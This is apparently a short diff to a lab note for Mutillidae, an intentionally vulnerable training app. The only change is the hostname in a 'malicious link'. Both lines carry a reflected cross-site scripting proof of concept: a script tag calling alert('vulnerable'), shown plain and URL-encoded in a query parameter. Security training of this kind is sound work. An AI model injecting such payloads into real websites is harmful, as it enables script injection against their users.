@@ -1,5 +1,5 @@
 PoC: ﻿<script>alert('vulnerable')</script>
 
-Malicious link: ﻿http://mutillidae.local/index.php?page=content-security-policy.php&message=%3Cscript%3Ealert(%27vulnerable%27)%3C/script%3E 
+Malicious link: ﻿http://mutillidae.localhost/index.php?page=content-security-policy.php&message=%3Cscript%3Ealert(%27vulnerable%27)%3C/script%3E 
 
 
